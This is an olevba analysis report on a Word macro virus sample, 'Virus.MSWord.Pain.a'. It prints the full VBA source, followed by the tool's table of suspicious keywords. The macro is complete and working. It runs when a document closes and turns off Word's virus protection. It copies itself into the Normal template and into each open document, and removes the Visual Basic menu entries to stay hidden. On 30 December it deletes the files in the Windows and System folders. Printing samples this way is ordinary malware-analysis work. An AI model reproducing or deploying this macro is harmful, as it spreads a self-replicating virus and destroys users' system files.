olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pain.a-dd4c44094ef37dd7c82722ee0c454b5cf4a008c3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pain.a-dd4c44094ef37dd7c82722ee0c454b5cf4a008c3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
On Error Resume Next
S = ActiveDocument.Saved
DisableAutoMacro = False
Text = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Countoflines)
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If Left(Date, 5) = "30.12" Then Kill ("C:\Windows\System\*.*"): Kill ("C:\Windows\*.*")
Set Mac = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If Mac.Lines(1, Mac.Countoflines) <> Text Then
Mac.DeleteLines 1, Mac.Countoflines: Mac.AddfromString Text
For Each Control In CommandBars("Menu Bar").Controls(6).Controls
If Control.Type = 10 Then
For I = 1 To Control.Controls.Count
If Right(Control.Controls(I).Caption, 5) = "Basic" Then Control.Delete
Next I
End If
Next Control
End If
Set Mac = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If Mac.Lines(1, Mac.Countoflines) <> Text Then Mac.DeleteLines 1, Mac.Countoflines: Mac.AddfromString Text
With Dialogs(wdDialogFileSummaryInfo): .Keywords = "Word97-2k.Macro.PAIN": .Execute: End With
If ActiveDocument.Path <> "" Then ActiveDocument.Save
ActiveDocument.Saved = S
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddfromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

